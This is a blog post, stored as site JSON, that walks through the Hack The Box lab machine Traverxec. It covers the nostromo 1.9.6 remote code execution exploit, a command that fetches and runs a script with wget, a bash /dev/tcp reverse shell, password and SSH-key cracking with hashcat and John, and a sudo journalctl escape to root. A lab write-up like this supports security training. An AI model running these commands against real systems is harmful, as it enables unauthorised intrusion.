{"componentChunkName":"component---src-components-blog-entry-js","path":"/2020-04-17-HTB-Traverxec/","result":{"data":{"markdownRemark":{"html":"<p>You start off by doing a nmap scan to see what ports are opened. This will give you an idea of what you could potentially exploit.</p>\n<h2>NMAP Scan</h2>\n<pre><code>...\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)\n| ssh-hostkey: \n|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)\n|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)\n80/tcp open  http    nostromo 1.9.6\n|_http-server-header: nostromo 1.9.6\n|_http-title: TRAVERXEC\nWarning: OSScan results may be unreliable because we could not\n...\n</code></pre>\n<p>At this time there is not much that can be done we with the port 22. More recon needs to be done. Looking up nostromo, you can find that version 1.9.6 is <a href=\"https://www.exploit-db.com/exploits/47837\">vulnerble</a> to Remote Code Execution (RCE). The readily avaialble exploit comes in the form of a python script (There is a Metasploit module also avialable). To run the script, a hostname, port and command must be supplied. You could leverage this to get a shell into the box but I decide to just issue a command to grab a <a href=\"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\">linux enumeration script</a> and run it. (This script was hosted locally).</p>\n<pre><code>python nostromo_exploit.py 10.10.10.165 80 \"cd /var/nostromo/logs/ &#x26;&#x26; wget http://10.10.14.31:8000/lse.sh.1 &#x26;&#x26; chmod u+x lse.sh.1 &#x26;&#x26; ./lse.sh.1\"\n</code></pre>\n<p>The output is quite long but the one thing that stands out.</p>\n<pre><code>                                        _____-2019-16278\n        _____  _______    ______   _____\\    \\   \n   _____\\    \\_\\      |  |      | /    / |    |  \n  /     /|     ||     /  /     /|/    /  /___/|  \n /     / /____/||\\    \\  \\    |/|    |__ |___|/  \n|     | |____|/ \\ \\    \\ |    | |       \\        \n|     |  _____   \\|     \\|    | |     __/ __     \n|\\     \\|\\    \\   |\\         /| |\\    \\  /  \\    \n| \\_____\\|    |   | \\_______/ | | \\____\\/    |   \n| |     /____/|    \\ |     | /  | |    |____/|   \n \\|_____|    ||     \\|_____|/    \\|____|   | |   \n        |____|/                        |___|/    \n\n\n\n\nHTTP/1.1 200 OK\nDate: Thu, 05 Mar 2020 07:21:53 GMT\nServer: nostromo 1.9.6\nConnection: close\n...\n===============================================================( software )=====\n...\n[!] sof040 Found any .htpasswd files?...................................... yes!\n---\n/var/nostromo/conf/.htpasswd\ndavid:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/\n---\n...\n==================================( FINISHED )==================================\n</code></pre>\n<p>We now have a username and potential password. From the looks of the hash this is md5crypt. You verify this running\n<code>hashcat --example-hashes</code> and searching for the pattern <code>$1$</code></p>\n<pre><code>hashcat -m 500 -a 0 ./pass.txt /usr/share/wordlists/rockyou.txt --force --show\n$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me\n</code></pre>\n<p>To do more recon establish a shell on box\n<code>python nostromo_exploit.py 10.10.10.165 80 \"nohup bash -c 'bash -i >&#x26; /dev/tcp/10.10.14.93/1337 0>&#x26;1'\"</code></p>\n<p>From within the box you can locate the nostromo configuration file. This file specifies the options for <a href=\"https://www.gsp.com/cgi-bin/man.cgi?section=8&#x26;topic=nhttpd#HOMEDIRS\">HOMEDIRS</a>. This specifies the home directory for nostromo. </p>\n<p><code>/var/nostromo/conf/</code></p>\n<p>The <code>homedirs_public</code> option is a publicly accessible folder. You cannot access the <code>~david/</code> but you can access <code>~david/public_www</code>.\nThe content of the directory is as follows</p>\n<pre><code>drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area\n\n./protected-file-area:\ntotal 16\ndrwxr-xr-x 2 david david 4096 Oct 25 17:02 .\ndrwxr-xr-x 3 david david 4096 Oct 25 15:45 ..\n-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess\n-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz\nwww-data@traverxec:/home/david/public_www$\n</code></pre>\n<p>The backup file contains the following</p>\n<pre><code>./home:\ntotal 12\ndrwxr-xr-x 3 root root 4096 Mar  5 19:10 .\ndrwxr-xr-x 3 root root 4096 Mar  5 20:26 ..\ndrwxr-xr-x 3 root root 4096 Mar  5 19:10 david\n\n./home/david:\ntotal 12\ndrwxr-xr-x 3 root root 4096 Mar  5 19:10 .\ndrwxr-xr-x 3 root root 4096 Mar  5 19:10 ..\ndrwx------ 2 1000 1000 4096 Oct 25 17:02 .ssh\n\n./home/david/.ssh:\ntotal 20\ndrwx------ 2 1000 1000 4096 Oct 25 17:02 .\ndrwxr-xr-x 3 root root 4096 Mar  5 19:10 ..\n-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 authorized_keys\n-rw------- 1 1000 1000 1766 Oct 25 17:02 id_rsa\n-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 id_rsa.pub\n</code></pre>\n<p>The public key is password protectec but can be cracked with <code>JohnTheRipper</code></p>\n<pre><code>oot@kali:~/HTB/Traverxec# john --wordlist=/usr/share/wordlists/rockyou.txt david.hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\nhunter           (home/david/.ssh/id_rsa)\nWarning: Only 2 candidates left, minimum 4 needed for performance.\n1g 0:00:00:03 DONE (2020-03-05 19:23) 0.3154g/s 4524Kp/s 4524Kc/s 4524KC/sa6_123..*7Â¡Vamos!\nSession completed\n</code></pre>\n<p>With this you can ssh as david and get the user flag.</p>\n<pre><code>root@kali:~/HTB/Traverxec/home/david# ssh david@10.10.10.165 -i .ssh/id_rsa \nEnter passphrase for key '.ssh/id_rsa': \nLinux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64\nLast login: Sat Apr 18 00:43:51 2020 from 10.10.14.93\ndavid@traverxec:~$ ls\nbin  public_www  user.txt\ndavid@traverxec:~$ \n</code></pre>\n<p>For the root flag, start from the bin directory in the david home directory. The file <code>server-stats.sh</code> contains a line that executes a sudo command.</p>\n<pre><code>david@traverxec:~/bin$ cat server-stats.sh \n#!/bin/bash\n\ncat /home/david/bin/server-stats.head\necho \"Load: `/usr/bin/uptime`\"\necho \" \"\necho \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\"\necho \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\"\necho \" \"\necho \"Last 5 journal log lines:\"\n/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat\n</code></pre>\n<p>You can use <a href=\"https://gtfobins.github.io/gtfobins/journalctl/#sudo\">journalctl</a> to escalate privilege to root.</p>\n<p>The following command is to be execute with the window smaller than usual to have the output piped to less. From less you can then execute a shell.\n<code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p>\n<p>from within less\n<code>!/bin/sh</code></p>\n<p>Output</p>\n<pre><code>david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service\n-- Logs begin at Sat 2020-04-18 01:33:\nApr 18 01:33:59 traverxec nhttpd[442]:\n!/bin/sh\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# cd /root\n# ls\nnostromo_1.9.6-1.deb  root.txt\n</code></pre>","frontmatter":{"path":"/htb-traverxec","title":"Hack The Box - Traverxec","date":"04/17/2020","featuredImage":{"childImageSharp":{"fluid":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAAC/klEQVQ4y42T32tTZxzGD7VNzTk5Oflxck5OkpOcNGkS09Rao6Zp7azQYR02tHVoLbVqqUVqbXVUVguD0Q02B/sBA7cLERXUq13uDxi4CcMr79z97vYP7Oqz931L2W4GXjwceJ8vz3me7w8tYkaRiFoWum5yQNMFDLoEQt0GprXHmVFRJ2BGLVVvREz0fRimepOcJglZ3N2l4+ZsJhYqzG4O0rk5wPBkQPhglIO9ESUmayUsK4Ztp7BTDknxTTmOEpOcJsV6DhiMTJfYethm/W6T+asNFlYO89FXLVa/OU7aTylRUzgN6wZeJsvR5jFGx04ydGSYk+PjpL2M4rSeLoPm+0XuCbHpWp6mk2XpdJulUy3adpblizVu/dAmloiraF6uQDbfR65Qothfo944TKlSp1Cq4mZ8tKiwv/Fjm7lGltmYx83FD/j71QvePtzhzPFDTIVc1u4MMnW9rvrreJ4QDASK+EFRCJaFeCDEciRTLlpjLM+Nz45yJhRnOeuze2sRXj7njwfbTArBS67PZNUR0VvoYZN4wsYv9AmxPlwR0yskSNhJkcDGiiXQxubKXN4YYKLL4o6wfKHZ4M/HuzxZm2G6mOd6IsNoJs7adyNYcUtEDlS8Sn2Icq1OqdZPvlhRbxk/QBs6VWD102GaWpiVdJadzgx//fKUZ5+ss1xpMKPHafUlufFtC8PYWzHbcYXLoojo4KQ90iKu62UFJ9Ymnkyw8eAEU8eqYgBL3N3Z5s3vL/n6yy/ozJ7nvf4TzK/W6Kw3VA+9nE8uKAlHFQLhSg6mXB1QcL3c3pRHzgV8/lOHhcUF5s9f4bdfX7OzvctgdZSlzWm2Ho1hp5OEwxHhKKOmmRb9lhFzqp8l/GKZlOuhyYUNdUc4PV9m++kEt+/P8uLn77l3f5lruy02xQYUqi6hHkMdgG5E/oXYu/B/IN80dXpRE+k0qLmcXalw4eMBPtxqMD5XEpOL0RvaE5OXsH+q/wdtv0jebG8oou64t0f+IKJ6ZhjmO4tJ/AOiv4Z1Fz8cJAAAAABJRU5ErkJggg==","aspectRatio":1.5625,"src":"/static/ab4983e68bed82413604c5284be6819a/ee604/traverxec.png","srcSet":"/static/ab4983e68bed82413604c5284be6819a/69585/traverxec.png 200w,\n/static/ab4983e68bed82413604c5284be6819a/497c6/traverxec.png 400w,\n/static/ab4983e68bed82413604c5284be6819a/ee604/traverxec.png 800w,\n/static/ab4983e68bed82413604c5284be6819a/9f0e2/traverxec.png 1190w","sizes":"(max-width: 800px) 100vw, 800px"}}}}}},"pageContext":{}}}